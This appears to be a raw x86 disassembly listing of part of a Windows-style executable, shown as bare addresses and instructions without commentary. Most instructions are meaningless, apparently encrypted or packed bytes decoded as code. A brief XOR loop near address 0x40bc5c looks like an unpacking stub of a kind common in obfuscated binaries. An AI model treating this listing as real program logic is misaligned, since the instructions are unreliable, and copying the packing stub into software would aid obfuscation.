  40b776:	ins    DWORD PTR es:[edi],dx
  40b777:	xor    edx,DWORD PTR [edx+0x18a00809]
  40b77d:	adc    esp,ecx
  40b77f:	stc    
  40b780:	ins    BYTE PTR es:[edi],dx
  40b781:	pusha  
  40b782:	xchg   edx,eax
  40b783:	mov    ecx,0x9c501437
  40b788:	push   ss
  40b789:	xor    ebx,ebp
  40b78b:	mov    ch,0xd1
  40b78d:	add    esi,DWORD PTR [edi]
  40b78f:	mov    ch,0x1b
  40b791:	add    bl,cl
  40b793:	js     0x40b7da
  40b795:	cs push ebp
  40b797:	jmp    0x61c9:0x94049d7f
  40b79e:	mov    ebx,0x376e6886
  40b7a3:	xlat   BYTE PTR ds:[ebx]
  40b7a4:	leave  
  40b7a5:	enter  0xd8ce,0x36
  40b7a9:	push   ds
  40b7aa:	outs   dx,BYTE PTR ds:[esi]
  40b7ab:	cmp    ah,dl
  40b7ad:	xchg   ebp,eax
  40b7ae:	cmp    DWORD PTR [ebp+eiz*8+0x12],esi
  40b7b2:	pop    es
  40b7b3:	xchg   dh,cl
  40b7b5:	add    eax,eax
  40b7b7:	pop    ds
  40b7b8:	shl    ecx,0x4b
  40b7bb:	push   edx
  40b7bc:	sub    DWORD PTR [edi],esi
  40b7be:	lea    edx,[ebp+0x62d642b2]
  40b7c4:	and    eax,0xf71d77af
  40b7c9:	fwait
  40b7ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7cb:	and    bl,bh
  40b7cd:	outs   dx,BYTE PTR ds:[esi]
  40b7ce:	leave  
  40b7cf:	(bad)  
  40b7d0:	js     0x40b7c0
  40b7d2:	xchg   ecx,eax
  40b7d3:	xor    DWORD PTR [edi+ebp*2],eax
  40b7d6:	fbstp  TBYTE PTR [edx+0x67dc860]
  40b7dc:	ins    BYTE PTR es:[edi],dx
  40b7dd:	repz fimul DWORD PTR [edi+ebx*2+0x5bc50ab9]
  40b7e5:	sub    al,0x7f
  40b7e7:	ficomp DWORD PTR [ebx+0x5c]
  40b7ea:	or     BYTE PTR [esi+0xf0fc051],al
  40b7f0:	lahf   
  40b7f1:	es mov ebp,0xe66f3ff5
  40b7f7:	inc    edx
  40b7f8:	mov    edi,0x298ed163
  40b7fd:	arpl   dx,bx
  40b7ff:	lods   eax,DWORD PTR ds:[esi]
  40b800:	mov    ebx,0xd424c760
  40b805:	loope  0x40b7fa
  40b807:	enter  0x358d,0xca
  40b80b:	fild   QWORD PTR [edx]
  40b80d:	adc    al,BYTE PTR [edx+0x44de7111]
  40b813:	mov    al,ds:0xb4de43a2
  40b818:	xchg   edi,eax
  40b819:	scas   eax,DWORD PTR es:[edi]
  40b81a:	fldcw  WORD PTR [edx+ebp*8+0x73d29d56]
  40b821:	mov    ds:0xffec1c6e,al
  40b826:	cmc    
  40b827:	hlt    
  40b828:	cmp    al,0x83
  40b82a:	leave  
  40b82b:	sbb    bl,bh
  40b82d:	in     al,dx
  40b82e:	cmp    eax,DWORD PTR [ecx]
  40b830:	or     eax,0x5342302c
  40b835:	fld    DWORD PTR [ecx+0x5656fcf0]
  40b83b:	adc    ebp,ebx
  40b83d:	cmp    eax,0x945d4164
  40b842:	cmp    DWORD PTR [ebp+ecx*8-0x10],0xc
  40b847:	dec    edi
  40b848:	lods   eax,DWORD PTR ds:[esi]
  40b849:	fisub  DWORD PTR [edi]
  40b84b:	mov    ebx,0xd230176e
  40b850:	aaa    
  40b851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b852:	mov    ebp,0x487a9102
  40b857:	dec    ebx
  40b858:	lock inc ebx
  40b85a:	pusha  
  40b85b:	ficomp WORD PTR [ecx+0x1d7e7f42]
  40b861:	add    eax,0x731746c
  40b866:	push   edi
  40b867:	aas    
  40b868:	loop   0x40b8c5
  40b86a:	clc    
  40b86b:	mov    esp,0x50a4fc1f
  40b870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b871:	movsx  esi,BYTE PTR [ecx-0x9]
  40b875:	test   ecx,ebp
  40b877:	or     BYTE PTR [ebp-0x12b0a754],bl
  40b87d:	sbb    BYTE PTR [ecx+0x49],al
  40b880:	mov    cl,0x75
  40b882:	xchg   ecx,eax
  40b883:	xchg   edi,eax
  40b884:	out    0xae,al
  40b886:	ret    0x27ad
  40b889:	jle    0x40b81c
  40b88b:	pop    es
  40b88c:	and    BYTE PTR [eax+0x61980f93],al
  40b892:	out    0x25,eax
  40b894:	jbe    0x40b818
  40b896:	xchg   edi,eax
  40b897:	dec    bp
  40b899:	addr16 xchg esi,eax
  40b89b:	fnstcw WORD PTR [eax]
  40b89d:	dec    ebx
  40b89e:	fcom   st(1)
  40b8a0:	mov    dh,0xe5
  40b8a2:	jmp    0x465e1ac
  40b8a7:	test   al,0x5d
  40b8a9:	pop    edi
  40b8aa:	stc    
  40b8ab:	out    0x60,eax
  40b8ad:	sbb    ch,BYTE PTR [ebp-0x42ef424f]
  40b8b3:	sbb    al,0x4e
  40b8b5:	sub    DWORD PTR [ecx],eax
  40b8b7:	js     0x40b8c1
  40b8b9:	inc    ecx
  40b8ba:	popf   
  40b8bb:	fwait
  40b8bc:	cmp    eax,0x47993fac
  40b8c1:	repnz sbb esp,DWORD PTR [ebx-0x3b66c5e]
  40b8c8:	test   DWORD PTR [edx-0x1b],esi
  40b8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8cc:	jecxz  0x40b914
  40b8ce:	test   al,0x91
  40b8d0:	je     0x40b8d3
  40b8d2:	push   es
  40b8d3:	push   edi
  40b8d4:	fdiv   DWORD PTR [ebp-0x5b459aa6]
  40b8da:	cli    
  40b8db:	data16 fmul QWORD PTR [ebx]
  40b8de:	sub    eax,DWORD PTR [esi+0x7a]
  40b8e1:	frstor [ebp-0x352f285]
  40b8e7:	and    DWORD PTR [eax],ebp
  40b8e9:	adc    esp,DWORD PTR [ecx+0x1d]
  40b8ec:	mov    esp,0x5232ef17
  40b8f1:	retf   0xd6a1
  40b8f4:	outs   dx,DWORD PTR ds:[esi]
  40b8f5:	cmp    eax,esp
  40b8f7:	add    al,0x62
  40b8f9:	sub    al,0xd2
  40b8fb:	shr    BYTE PTR [ecx+0x4f],cl
  40b8fe:	aas    
  40b8ff:	mov    eax,0x997a3216
  40b904:	gs lahf 
  40b906:	sub    cl,al
  40b908:	pop    esi
  40b909:	inc    edx
  40b90a:	cmp    DWORD PTR [eax-0x125d0a04],edx
  40b910:	push   0x3d187047
  40b915:	(bad)  
  40b916:	test   al,0x31
  40b918:	jnp    0x40b929
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	ror    DWORD PTR [ebx+0x7b],cl
  40b940:	outs   dx,BYTE PTR ds:[esi]
  40b941:	pop    ebx
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	sub    BYTE PTR [eax-0x2ee70788],dh
  40b950:	iret   
  40b951:	inc    ebp
  40b952:	add    BYTE PTR [ebp+esi*1-0xcaf0dd8],bh
  40b959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95a:	fs aaa 
  40b95c:	dec    esi
  40b95d:	dec    esi
  40b95e:	jo     0x40b923
  40b960:	cmp    al,BYTE PTR [ebx+0x4b52b64e]
  40b966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b967:	js     0x40b8f3
  40b969:	sbb    BYTE PTR [esi],ah
  40b96b:	or     eax,0xc558cfb1
  40b970:	push   0x41
  40b972:	jge    0x40b993
  40b974:	push   es
  40b975:	(bad)  [edx-0x63cdc742]
  40b97b:	push   ecx
  40b97c:	fwait
  40b97d:	call   0x77597b1d
  40b982:	mov    ?,WORD PTR [edx-0x7a]
  40b985:	jae    0x40b9b2
  40b987:	outs   dx,BYTE PTR ds:[esi]
  40b988:	aam    0x8c
  40b98a:	pop    ecx
  40b98b:	aad    0x5e
  40b98d:	mov    WORD PTR [esi-0x6fcd26f9],ds
  40b993:	pop    ebp
  40b994:	imul   ebx,edi,0x2b21aee6
  40b99a:	jle    0x40b94a
  40b99c:	dec    DWORD PTR [ecx+0x4a]
  40b99f:	xchg   ebx,eax
  40b9a0:	daa    
  40b9a1:	push   ebx
  40b9a2:	ret    0x511f
  40b9a5:	add    bh,BYTE PTR [ecx-0x4a]
  40b9a8:	std    
  40b9a9:	gs jg  0x40b9d7
  40b9ac:	sub    ch,BYTE PTR [edi-0x78dd6a93]
  40b9b2:	rcl    DWORD PTR [edi*4-0x7b279225],0x21
  40b9ba:	sti    
  40b9bb:	xor    dh,BYTE PTR [esi+0x438ef8b2]
  40b9c1:	mov    ecx,0xa837eb45
  40b9c6:	add    al,0xa4
  40b9c8:	xor    eax,DWORD PTR [edx+0x8]
  40b9cb:	dec    edi
  40b9cc:	mov    WORD PTR [edx+0x43a851da],?
  40b9d2:	cmp    DWORD PTR [ebx-0x3b88823b],0x13
  40b9d9:	dec    ecx
  40b9da:	pop    edx
  40b9db:	ds call 0xdeea8c2a
  40b9e1:	stos   BYTE PTR es:[edi],al
  40b9e2:	mov    cl,0x73
  40b9e4:	jns    0x40ba02
  40b9e6:	jb     0x40b9e9
  40b9e8:	inc    esp
  40b9e9:	xor    eax,0x5b5056d8
  40b9ee:	pop    edi
  40b9ef:	out    dx,al
  40b9f0:	sub    ch,BYTE PTR [edx+0x5c]
  40b9f3:	mov    ebp,0x821cb060
  40b9f8:	out    0x76,al
  40b9fa:	dec    ebx
  40b9fb:	jo     0x40ba0f
  40b9fd:	cmp    dh,al
  40b9ff:	je     0x40b98e
  40ba01:	mov    ds:0x4c020a34,eax
  40ba06:	out    0x4a,al
  40ba08:	or     dh,BYTE PTR [esi+0x5e]
  40ba0b:	sub    edx,DWORD PTR [bp+si+0x4959]
  40ba10:	xor    al,0xd8
  40ba12:	imul   esi,DWORD PTR [edx-0x43],0x666405c0
  40ba19:	std    
  40ba1a:	ja     0x40ba3a
  40ba1c:	push   esp
  40ba1d:	push   esp
  40ba1e:	and    ecx,DWORD PTR [edx]
  40ba20:	leave  
  40ba21:	rcl    BYTE PTR [edx],1
  40ba23:	or     eax,0x93b8053c
  40ba28:	cmp    dl,BYTE PTR [edi-0x68fd8c2c]
  40ba2e:	sar    BYTE PTR [eax+0xf],1
  40ba31:	mov    edi,0x98779c07
  40ba36:	pop    edx
  40ba37:	jmp    0xf0e5:0x8f919a72
  40ba3e:	aas    
  40ba3f:	sbb    al,0xac
  40ba41:	push   ebp
  40ba42:	in     al,dx
  40ba43:	cmp    dl,BYTE PTR [edx]
  40ba45:	mov    bl,0x28
  40ba47:	mov    bh,0x12
  40ba49:	push   ecx
  40ba4a:	lock stos DWORD PTR es:[edi],eax
  40ba4c:	jbe    0x40ba19
  40ba4e:	jne    0x40ba38
  40ba50:	popa   
  40ba51:	xor    eax,0x6cde7b6
  40ba56:	fimul  DWORD PTR [edx+0x428e02db]
  40ba5c:	jge    0x40b9eb
  40ba5e:	je     0x40ba7f
  40ba60:	push   cs
  40ba61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba62:	imul   edi,ecx,0x60
  40ba65:	xchg   ebp,eax
  40ba66:	pop    ds
  40ba67:	retf   0x708
  40ba6a:	int3   
  40ba6b:	stos   DWORD PTR es:[edi],eax
  40ba6c:	adc    DWORD PTR [esi],edi
  40ba6e:	cmp    dl,BYTE PTR [edi+0x15f8fcfc]
  40ba74:	dec    esp
  40ba75:	adc    BYTE PTR [ebx+0x5dea6ea2],dh
  40ba7b:	and    al,0xe3
  40ba7d:	and    dl,BYTE PTR [esi+0x27]
  40ba80:	cwde   
  40ba81:	ds pop ebx
  40ba83:	mov    ds:0x909ea0a7,eax
  40ba88:	dec    ebx
  40ba89:	pop    edi
  40ba8a:	cmp    eax,DWORD PTR [ebx-0x34d08235]
  40ba90:	cs call 0xf24e0f11
  40ba96:	daa    
  40ba97:	int    0x8d
  40ba99:	push   0xffffff83
  40ba9b:	fcmovb st,st(7)
  40ba9d:	fisttp QWORD PTR [esi-0x7d5457c4]
  40baa3:	aaa    
  40baa4:	jne    0x40bb09
  40baa6:	das    
  40baa7:	adc    edx,DWORD PTR [ebx-0x77]
  40baaa:	dec    esp
  40baab:	jmp    0xaec8e97c
  40bab0:	push   ebx
  40bab1:	shl    ch,cl
  40bab3:	xchg   cl,ah
  40bab5:	bound  edi,QWORD PTR [ebx+edi*8]
  40bab8:	(bad)  
  40bab9:	push   ecx
  40baba:	ins    BYTE PTR es:[edi],dx
  40babb:	out    dx,eax
  40babc:	push   ss
  40babd:	or     cl,bh
  40babf:	inc    eax
  40bac0:	ret    0xbf7f
  40bac3:	dec    edx
  40bac4:	mov    ebx,DWORD PTR [ecx+0x13]
  40bac7:	aam    0xc1
  40bac9:	mov    ds,WORD PTR [ebp-0x5e]
  40bacc:	int3   
  40bacd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bace:	push   esp
  40bacf:	jge    0x40bac0
  40bad1:	and    ebp,0x322224e6
  40bad7:	xchg   esi,eax
  40bad8:	test   ebp,eax
  40bada:	paddd  mm0,QWORD PTR [ebx+0x74567d8]
  40bae1:	es xchg bx,ax
  40bae4:	fstp   st(1)
  40bae6:	push   ebx
  40bae7:	enter  0x4ad4,0x60
  40baeb:	jecxz  0x40ba83
  40baed:	jge    0x40baec
  40baef:	call   0x7b3f:0x7c7ea1d8
  40baf6:	or     ebp,ebx
  40baf8:	imul   eax,DWORD PTR ds:0x2ff14f50,0xf0ff9ee2
  40bb02:	ins    BYTE PTR es:[edi],dx
  40bb03:	xchg   ebp,eax
  40bb04:	cmp    ebp,esp
  40bb06:	cld    
  40bb07:	enter  0x8ae2,0x5b
  40bb0b:	mov    ebp,0x6cda5f1f
  40bb10:	sub    ebx,DWORD PTR ds:0xc5ad1c90
  40bb16:	push   eax
  40bb17:	nop
  40bb18:	shl    BYTE PTR [edx+0x1e54157c],0xcd
  40bb1f:	in     al,dx
  40bb20:	stos   BYTE PTR es:[edi],al
  40bb21:	xchg   esi,eax
  40bb22:	push   0x21
  40bb24:	out    0x77,al
  40bb26:	icebp  
  40bb27:	push   ebp
  40bb28:	and    al,0x13
  40bb2a:	xchg   ebp,eax
  40bb2b:	addr16 mov al,ds:0xbd84
  40bb2f:	enter  0x7a13,0x8b
  40bb33:	add    esi,ebp
  40bb35:	fdiv   st,st(7)
  40bb37:	lahf   
  40bb38:	adc    BYTE PTR [edx-0x51],0x86
  40bb3c:	aaa    
  40bb3d:	xchg   ecx,eax
  40bb3e:	or     eax,0xc08522d6
  40bb43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb44:	out    dx,eax
  40bb45:	popf   
  40bb46:	fld    TBYTE PTR [ebx+0x60a7f2b0]
  40bb4c:	xchg   edx,eax
  40bb4d:	and    ebp,DWORD PTR [edx+0x5b]
  40bb50:	xor    al,0xd4
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	lods   eax,DWORD PTR ds:[esi]
  40bb54:	or     BYTE PTR [ecx+0x21],dh
  40bb57:	inc    esp
  40bb58:	in     eax,0xa
  40bb5a:	mov    ebp,0x94ca339d
  40bb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb60:	adc    dh,bl
  40bb62:	or     al,0x53
  40bb64:	out    dx,eax
  40bb65:	in     eax,0x8e
  40bb67:	xor    bh,BYTE PTR fs:[eax]
  40bb6a:	retf   0x98a8
  40bb6d:	out    dx,al
  40bb6e:	int    0x50
  40bb70:	daa    
  40bb71:	push   ecx
  40bb72:	pop    es
  40bb73:	add    DWORD PTR [esi],ecx
  40bb75:	jmp    0xb3c087bd
  40bb7a:	jecxz  0x40bb81
  40bb7c:	sbb    eax,eax
  40bb7e:	int    0xe9
  40bb80:	cmp    BYTE PTR [ecx+0x5e3b39bc],ch
  40bb86:	pop    ds
  40bb87:	add    al,BYTE PTR [esi-0x80]
  40bb8a:	ret    0x345f
  40bb8d:	mov    cl,al
  40bb8f:	push   ebp
  40bb90:	mov    bh,0xc2
  40bb92:	cmp    DWORD PTR [ecx-0x2e21c06f],edx
  40bb98:	in     al,dx
  40bb99:	sbb    ch,ch
  40bb9b:	stc    
  40bb9c:	mov    ebx,0x6a74e4fe
  40bba1:	fdivr  DWORD PTR [ecx+0x22c5857f]
  40bba7:	xlat   BYTE PTR ds:[ebx]
  40bba8:	jge    0x40bb47
  40bbaa:	adc    ebx,DWORD PTR [esi+0x70]
  40bbad:	and    ah,BYTE PTR [ebx-0x566dc475]
  40bbb3:	xor    BYTE PTR [ecx-0x40],0x8f
  40bbb7:	ins    BYTE PTR es:[edi],dx
  40bbb8:	dec    esi
  40bbb9:	jl     0x40bbb0
  40bbbb:	test   BYTE PTR [ebx],0x81
  40bbbe:	imul   esp,DWORD PTR [edi],0x17
  40bbc1:	push   ecx
  40bbc2:	or     edx,DWORD PTR [esi+edx*2+0x646f4a79]
  40bbc9:	xchg   ebp,eax
  40bbca:	ss sub dl,dh
  40bbcd:	out    0x2,al
  40bbcf:	xchg   esi,eax
  40bbd0:	cdq    
  40bbd1:	clc    
  40bbd2:	push   0xffffffe2
  40bbd4:	popa   
  40bbd5:	xlat   BYTE PTR ds:[ebx]
  40bbd6:	push   ebx
  40bbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd8:	ss inc ebp
  40bbda:	out    dx,al
  40bbdb:	add    BYTE PTR [ebx],dh
  40bbdd:	dec    ebp
  40bbde:	pop    ds
  40bbdf:	inc    esi
  40bbe0:	arpl   sp,bx
  40bbe2:	pop    ebx
  40bbe3:	cs mov WORD PTR cs:[edi-0x1917e75c],es
  40bbeb:	adc    eax,0xc75f7bb3
  40bbf0:	in     eax,dx
  40bbf1:	adc    eax,0x622cef91
  40bbf6:	sti    
  40bbf7:	mov    eax,0x9435f7ed
  40bbfc:	mov    ebp,0x6939e8b0
  40bc01:	pop    ss
  40bc02:	les    ecx,FWORD PTR [edx+0x7015b6a7]
  40bc08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc09:	call   0x94f4:0x6fe11d7f
  40bc10:	(bad)  
  40bc11:	jae    0x40bc67
  40bc13:	mov    bh,0x5
  40bc15:	and    al,dl
  40bc17:	push   cs
  40bc18:	test   al,0x66
  40bc1a:	in     al,dx
  40bc1b:	or     dl,al
  40bc1d:	(bad)  
  40bc1e:	xlat   BYTE PTR ds:[ebx]
  40bc1f:	pop    edx
  40bc20:	loop   0x40bc70
  40bc22:	push   esp
  40bc23:	and    BYTE PTR [edx+ebx*1-0x713caae],cl
  40bc2a:	sub    al,0x3c
  40bc2c:	cmp    al,0xcb
  40bc2e:	fimul  WORD PTR [edx]
  40bc30:	xlat   BYTE PTR ds:[ebx]
  40bc31:	xchg   ebp,eax
  40bc32:	stos   DWORD PTR es:[edi],eax
  40bc33:	sbb    BYTE PTR [ecx+0x43],dl
  40bc36:	inc    ebx
  40bc37:	mov    eax,ds:0x88b29793
  40bc3c:	(bad)  
  40bc3d:	cs leave 
  40bc3f:	mov    ch,0xf1
  40bc41:	aam    0xba
  40bc43:	enter  0x425b,0x8b
  40bc47:	inc    ebp
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc65
  40bc7d:	test   al,0x47
  40bc7f:	fadd   st(2),st
  40bc81:	xchg   ecx,eax
  40bc82:	js     0x40bcfc
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	and    DWORD PTR [edx-0x5799b200],ebp
  40bc8e:	xor    al,BYTE PTR [edi+ecx*2-0x17]
  40bc92:	stc    
  40bc93:	pop    ebp
  40bc94:	sub    eax,0xaffaa6a0
  40bc99:	or     DWORD PTR [edi],ecx
  40bc9b:	and    eax,0xc97d4ab
  40bca0:	je     0x40bd1b
  40bca2:	add    eax,0x881cfc9f
  40bca7:	dec    ebx
  40bca8:	mov    eax,0xad5a530e
  40bcad:	sub    DWORD PTR [ecx],eax
  40bcaf:	and    al,0x8a
  40bcb1:	push   esi
  40bcb2:	retf   
  40bcb3:	inc    ebx
  40bcb4:	cld    
  40bcb5:	loop   0x40bc85
  40bcb7:	and    ebx,DWORD PTR ds:0x38cbcc01
  40bcbd:	xchg   esi,eax
  40bcbe:	mov    dh,0x75
  40bcc0:	adc    al,0xc8
  40bcc2:	cmp    edx,DWORD PTR [esi+edi*8]
  40bcc5:	add    ecx,DWORD PTR [edi]
  40bcc7:	jno    0x40bca7
  40bcc9:	js     0x40bc91
  40bccb:	pop    ecx
  40bccc:	mov    BYTE PTR [esi+0x66],ah
  40bccf:	pop    ebp
  40bcd0:	sbb    eax,0x1419e7d9
  40bcd5:	push   esp
  40bcd6:	or     DWORD PTR [ebx-0x71182dd8],eax
  40bcdc:	(bad)  
  40bcdd:	or     ebx,esi
  40bcdf:	mov    dl,0xdd
  40bce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bce2:	cli    
  40bce3:	mov    edx,0x3c74f28f
  40bce8:	test   BYTE PTR [edi-0x22],0x35
  40bcec:	lahf   
  40bced:	cmc    
  40bcee:	pop    edi
  40bcef:	xchg   bp,ax
  40bcf1:	cs test edi,ecx
  40bcf4:	shl    DWORD PTR [ebx],cl
  40bcf6:	sti    
  40bcf7:	sar    ecx,1
  40bcf9:	and    esp,DWORD PTR [ecx-0x47162d7b]
  40bcff:	rcl    BYTE PTR [edx],1
  40bd01:	dec    ebp
  40bd02:	stos   DWORD PTR es:[edi],eax
  40bd03:	sub    esi,edx
  40bd05:	adc    eax,0xb21c32da
  40bd0a:	in     eax,0x8b
  40bd0c:	mul    bh
  40bd0e:	fadd   st(3),st
  40bd10:	xor    ch,cl
  40bd12:	or     DWORD PTR [edx-0x4e],ebx
  40bd15:	dec    esi
  40bd16:	js     0x40bcc9
  40bd18:	jae    0x40bd2f
  40bd1a:	fisubr WORD PTR [esi-0xf8306e]
  40bd20:	sar    bh,1
  40bd22:	repz xor ax,WORD PTR [edi-0x31]
  40bd27:	imul   eax,DWORD PTR [esi-0x18],0xe
  40bd2b:	or     eax,edi
  40bd2d:	cs mov esi,0x88c2ee6
  40bd33:	jae    0x40bd2b
  40bd35:	mov    bl,0x1
  40bd37:	ins    DWORD PTR es:[edi],dx
  40bd38:	fisub  WORD PTR [eax-0x5640cdd4]
  40bd3e:	xor    edx,esp
  40bd40:	mov    bl,0xb0
  40bd42:	pop    ebx
  40bd43:	out    0xeb,al
  40bd45:	fadd   QWORD PTR [edi-0x95a0775]
  40bd4b:	adc    ebx,edi
  40bd4d:	test   al,0x57
  40bd4f:	and    al,0x1b
  40bd51:	sbb    bl,BYTE PTR [esp+eiz*4+0x33]
  40bd55:	out    0x8a,al
  40bd57:	retf   
  40bd58:	cmp    ch,BYTE PTR ds:0x6170c69f
  40bd5e:	mov    esi,gs
  40bd60:	mov    eax,ds:0xcec5cbcc
  40bd65:	xchg   al,dh
  40bd67:	mov    dl,0xc1
  40bd69:	sahf   
  40bd6a:	iret   
  40bd6b:	ss das 
  40bd6d:	loopne 0x40bd06
  40bd6f:	ror    BYTE PTR [edi-0x18],0xe4
  40bd73:	mul    eax
  40bd75:	nop
  40bd76:	test   BYTE PTR [ebp+0x20],bl
  40bd79:	repnz pop esi
  40bd7b:	icebp  
  40bd7c:	bound  esi,QWORD PTR [ebp-0x45916821]
  40bd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd83:	enter  0x5de7,0x8f
  40bd87:	mov    gs,WORD PTR [edi]
  40bd89:	sbb    esi,DWORD PTR [edi+esi*4-0x18]
  40bd8d:	je     0x40bd83
  40bd8f:	add    ecx,DWORD PTR [edx]
  40bd91:	inc    edi
  40bd92:	loope  0x40bd67
  40bd94:	frstor [ebp-0x1eb9d6fc]
  40bd9a:	fisubr WORD PTR [ecx+0x2483c278]
  40bda0:	test   BYTE PTR ds:0x2fba6ff4,dh
  40bda6:	adc    eax,0x994de618
  40bdab:	fadd   DWORD PTR [ebp+0x64]
  40bdae:	sbb    ecx,edi
  40bdb0:	cmc    
  40bdb1:	push   eax
  40bdb2:	sahf   
  40bdb3:	xor    al,0xa5
  40bdb5:	scas   al,BYTE PTR es:[edi]
  40bdb6:	rcr    DWORD PTR [ebx-0x459868b4],cl
  40bdbc:	das    
  40bdbd:	pop    ebp
  40bdbe:	xchg   DWORD PTR [ebx-0x5af5bf5f],ebp
  40bdc4:	aam    0xa
  40bdc6:	push   ss
  40bdc7:	sub    bh,dl
  40bdc9:	imul   ebx,DWORD PTR [ebx-0x7],0x5cebff95
  40bdd0:	mov    esp,0xacf53c91
  40bdd5:	fld    st(7)
  40bdd7:	push   0x5ff7982d
  40bddc:	xchg   DWORD PTR [edx-0x8],esi
  40bddf:	add    eax,DWORD PTR [eax]
  40bde1:	mov    esi,0x3e82fb55
  40bde6:	adc    eax,0xefade324
  40bdeb:	xchg   ecx,eax
  40bdec:	push   edi
  40bded:	and    al,0xd1
  40bdef:	push   ecx
  40bdf0:	xchg   edx,eax
  40bdf1:	dec    ebp
  40bdf2:	pop    esi
  40bdf3:	add    eax,0x70373e9d
  40bdf8:	lahf   
  40bdf9:	inc    ebp
  40bdfa:	scas   eax,DWORD PTR es:[edi]
  40bdfb:	cmp    al,0x95
  40bdfd:	jne    0x40bde2
  40bdff:	ins    DWORD PTR es:[edi],dx
  40be00:	dec    ecx
  40be01:	pop    ecx
  40be02:	sbb    al,0x76
  40be04:	or     eax,0x7ec9b82a
  40be09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0a:	jl     0x40be78
  40be0c:	jmp    0x40bdde
  40be0e:	aas    
  40be0f:	cdq    
  40be10:	pop    edi
  40be11:	sub    ah,BYTE PTR [ecx-0x3d979e8a]
  40be17:	int    0x63
  40be19:	fsubr  DWORD PTR [eax]
  40be1b:	std    
  40be1c:	iret   
  40be1d:	inc    esi
  40be1e:	inc    esi
  40be1f:	add    DWORD PTR ds:0x2cfccb29,ecx
  40be25:	jmp    0x40bde6
  40be27:	xlat   BYTE PTR ds:[ebx]
  40be28:	and    DWORD PTR [edi],edi
  40be2a:	xor    BYTE PTR [ebp+edi*1-0x3f],bh
  40be2e:	sbb    BYTE PTR [edi],0x61
  40be31:	dec    ebp
  40be32:	out    dx,al
  40be33:	ret    0x2d92
  40be36:	dec    edx
  40be37:	adc    ebp,DWORD PTR [edx+0x1]
  40be3a:	push   ecx
  40be3b:	jb     0x40bdd5
  40be3d:	mov    ecx,DWORD PTR [edi-0x48]
  40be40:	jl     0x40be24
  40be42:	dec    esi
  40be43:	xor    al,0x86
  40be45:	or     DWORD PTR [edx+0x25],esp
  40be48:	add    dh,BYTE PTR [ebx+eiz*4+0x6e]
  40be4c:	(bad)  
  40be4d:	push   ebp
  40be4e:	bound  eax,QWORD PTR [ecx*2-0x611cae03]
  40be55:	and    al,0xec
  40be57:	sbb    BYTE PTR [esi],ah
  40be59:	mov    dh,0xe9
  40be5b:	inc    esp
  40be5c:	lock jg 0x40bea1
  40be5f:	cmp    ch,dh
  40be61:	sbb    cl,BYTE PTR [ebp-0x9]
  40be64:	repz call 0x827187e7
  40be6a:	mov    BYTE PTR [ebx+0x41],cl
  40be6d:	lds    esp,FWORD PTR [edx]
  40be6f:	sar    BYTE PTR [eax+esi*2],cl
  40be72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be73:	in     eax,dx
  40be74:	ds cli 
  40be76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be77:	fild   QWORD PTR [esi]
  40be79:	adc    dh,BYTE PTR [ebp-0x6d2e951d]
  40be7f:	and    DWORD PTR [esi+esi*4-0x31],esp
  40be83:	out    0x7a,al
  40be85:	rcl    BYTE PTR [eax-0x4a],0x24
  40be89:	(bad)  
  40be8a:	frstor ds:0xbe4b875b
  40be90:	mov    esi,0x69ceb719
  40be95:	mov    cl,0xfe
  40be97:	push   eax
  40be98:	fisub  DWORD PTR [ebx+0x34]
  40be9b:	cmp    DWORD PTR [esi-0x1e479df6],0x2cbba395
  40bea5:	fisub  DWORD PTR [ecx+0x24]
  40bea8:	push   cs
  40bea9:	(bad)
  40beae:	lahf   
  40beaf:	sub    esi,ecx
  40beb1:	pusha  
  40beb2:	popa   
  40beb3:	daa    
  40beb4:	jae    0x40be9e
  40beb6:	lods   eax,DWORD PTR ds:[esi]
  40beb7:	fs xchg edx,eax
  40beb9:	dec    esi
  40beba:	data16 fdivr QWORD PTR [ebx+0x3]
  40bebe:	out    dx,eax
  40bebf:	(bad)  
  40bec0:	pusha  
  40bec1:	push   ebp
  40bec2:	loope  0x40bece
  40bec4:	jbe    0x40befc
